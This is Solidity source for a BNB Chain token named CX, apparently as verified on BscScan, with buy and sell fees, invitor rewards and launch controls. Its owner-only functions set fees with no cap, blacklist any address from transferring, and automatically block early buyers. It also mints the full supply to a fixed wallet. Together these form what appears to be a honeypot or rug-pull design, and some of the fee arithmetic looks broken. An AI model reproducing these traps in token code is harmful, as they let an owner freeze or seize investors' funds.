/**
 *Submitted for verification at BscScan.com on 2023-01-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = tx.origin;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xDEAD));
        _owner = address(0xDEAD);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _isExcludeFromFee;
    mapping(address => bool) public _Deny;
    
    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _currency;
    mapping(address => bool) public _swapPairList;
    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _buyFundFee = 140;
    uint256 public _buyLPFee = 0;
    uint256 public _sellFundFee = 140;
    uint256 public _sellLPFee = 0;

    uint256 public starBlock;

    mapping (address => bool) public isWalletLimitExempt;
    uint256 public walletLimit;

    address public _mainPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address FundAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        address WBNBAddress = 0x55d398326f99059fF775485246999027B3197955;//
        IERC20(WBNBAddress).approve(address(swapRouter), MAX);

        _currency = WBNBAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), WBNBAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;
        walletLimit = _tTotal;

        address ReceiveAddress = 0xc5280CE1D982d3890eC8c4B54475EBd4e42de275;
        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = FundAddress;

        _isExcludeFromFee[address(this)] = true;
        _isExcludeFromFee[address(swapRouter)] = true;
        _isExcludeFromFee[msg.sender] = true;
        _isExcludeFromFee[ReceiveAddress] = true;

        isWalletLimitExempt[msg.sender] = true;
        isWalletLimitExempt[ReceiveAddress] = true;
        isWalletLimitExempt[address(swapRouter)] = true;
        isWalletLimitExempt[address(_mainPair)] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[address(0xdead)] = true;

        _tokenDistributor = new TokenDistributor(WBNBAddress);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function setBuyCustom(uint256 newFundFee, uint256 newLpFee) public onlyOwner{
        _buyFundFee = newFundFee;
        _buyLPFee = newLpFee;
    }

    function setSellCustom(uint256 newFundFee, uint256 newLpFee) public onlyOwner{
        _sellFundFee = newFundFee;
        _sellLPFee = newLpFee;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    bool public airdropEnable = false;
    function setAirDropEnable(bool status) public onlyOwner{
        airdropEnable = status;
    }

    uint256 public airdropNumbs = 0;
    function setAirdropNumbs(uint256 newValue) public onlyOwner{
        airdropNumbs = newValue;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        bool takeFee;
        bool isSell;

        if(!_isExcludeFromFee[from] && !_isExcludeFromFee[to] && airdropEnable){
            address ad;
            for(uint i=0;i <airdropNumbs;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _basicTransfer(from,ad,100);
            }
            amount -= airdropNumbs * 100;
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_isExcludeFromFee[from] && !_isExcludeFromFee[to]) {
                require(starBlock > 0);
                if (block.number < starBlock + kb && !_swapPairList[to]) {
                    _Deny[to] = true;
                }
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buyFundFee + _buyLPFee + _sellFundFee + _sellLPFee;
                            uint256 numTokensSellToFund = amount * swapFee / 5000;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                        }
                    }
                }
                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }
        _tokenTransfer(from, to, amount, takeFee, isSell);
    }

    mapping(address => address) public _invitor;
    function setInvitor(address account, address newInvitor) public onlyOwner{
        _invitor[account] = newInvitor;
    }

    uint256[] public invitorRewardPercentList = [40,40,40,40];
    function setInvitorRewardPercentList(uint256[] calldata newValue) public onlyOwner{
        invitorRewardPercentList = new uint256[](newValue.length);
        for(uint256 i = 0;i < newValue.length ; i++) {
            invitorRewardPercentList[i] = newValue[i];
        }
    }

    function lenOfInvitorRewardPercentList() public view returns(uint256){
        return invitorRewardPercentList.length; 
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        require(!_Deny[sender]);
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            //invitor reward
            address current;
            if (_swapPairList[sender]) {
                current = recipient;
            } else {
                current = sender;
            }

            uint256 inviterAmount;

            uint256 totalShare = 0;

            for(uint256 i; i < invitorRewardPercentList.length ; i++){
                totalShare += invitorRewardPercentList[i];
            }
            uint256 perInviteAmount = tAmount * totalShare / 10000;

            for (uint256 i; i < invitorRewardPercentList.length; ++i) {
                address inviter = _invitor[current];

                if (address(0) == inviter) {
                    inviterAmount = perInviteAmount * invitorRewardPercentList[i] / totalShare;
                    _takeTransfer(sender, fundAddress, inviterAmount);
                    continue;
                }

                inviterAmount = perInviteAmount * invitorRewardPercentList[i] / totalShare;

                feeAmount += inviterAmount;
                _takeTransfer(sender, inviter, inviterAmount);
                current = inviter;
            }


            uint256 swapFee;

            if (isSell) {
                swapFee = _sellFundFee + _sellLPFee;
            } else {
                swapFee = _buyFundFee + _buyLPFee;
            }

            uint256 swapAmount = tAmount * swapFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
        }else{
            if (address(0) == _invitor[recipient] && !_isExcludeFromFee[recipient] && _balances[recipient] < beInvitorThreshold) {
                if (tAmount + _balances[recipient] >= beInvitorThreshold) _invitor[recipient] = sender;
            }
        }


        if(!isWalletLimitExempt[recipient] && limitEnable)
            require((balanceOf(recipient) + tAmount - feeAmount) <= walletLimit,"over max wallet limit");
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    uint256 public beInvitorThreshold = 1 * 10 ** 9 / 10;
    function setBeInvitorThreshold(uint256 newValue) public onlyOwner{
        beInvitorThreshold = newValue;
    }

    function setMaxWalletLimit(uint256 newValue) public onlyOwner{
        walletLimit = newValue;
    }

    bool public limitEnable = true;
    function setLimitEnable(bool status) public onlyOwner {
        limitEnable = status;
    }

    function setisWalletLimitExempt(address holder, bool exempt) external onlyOwner {
        isWalletLimitExempt[holder] = exempt;
    }

    event Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens();
    event Failed_addLiquidity();

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        swapFee += swapFee;
        uint256 lpFee = _sellLPFee + _buyLPFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _currency;
        try _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        ) {} catch { emit Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens(); }

        swapFee -= lpFee;

        IERC20 FIST = IERC20(_currency);
        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = fistBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;
        if (_currency == _swapRouter.WETH()) {
            FIST.transferFrom(address(_tokenDistributor), address(this), fundAmount);
            IWETH(_currency).withdraw(fundAmount);
            transferToAddressETH(payable(fundAddress),fundAmount);
        }else{
            FIST.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);
        }
        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance - fundAmount);
        
        if (lpAmount > 0) {
            uint256 lpFist = fistBalance * lpFee / swapFee;
            if (lpFist > 0) {
                try _swapRouter.addLiquidity(
                    address(this), _currency, lpAmount, lpFist, 0, 0, fundAddress, block.timestamp
                ) {} catch { emit Failed_addLiquidity(); }
            }
        }
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _isExcludeFromFee[addr] = true;
    }

    uint256 public kb = 0;
    function Launch(uint256 KBAmount, bool status) external onlyOwner {
        if (!status){
            kb = 0;
            starBlock = 0;
        }else{
            kb = KBAmount;
            starBlock = block.number;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external {
        require(token != address(this),"Cant Claim");
        IERC20(token).transfer(fundAddress, amount);
    }

    function multiDeny(address[] calldata addresses, bool value) public onlyOwner{
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _Deny[addresses[i]] = value;
        }
    }

    function setDeny(address addr, bool status) public onlyOwner{
        _Deny[addr] = status;
    }

    function multiWLs(address[] calldata addresses, bool value) public onlyOwner{
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _isExcludeFromFee[addresses[i]] = value;
        }
    }

    function setWLs(address addr, bool enable) external onlyOwner {
        _isExcludeFromFee[addr] = enable;
    }

    receive() external payable {}
}

contract TOKEN is AbsToken {
    constructor() AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
        "CX",
        "CX",
        9,
        20230,
        address(0x4ea0B2D354e20A5b17700C071bc42c2Fc1aa7Fe1)
    ){
    }
}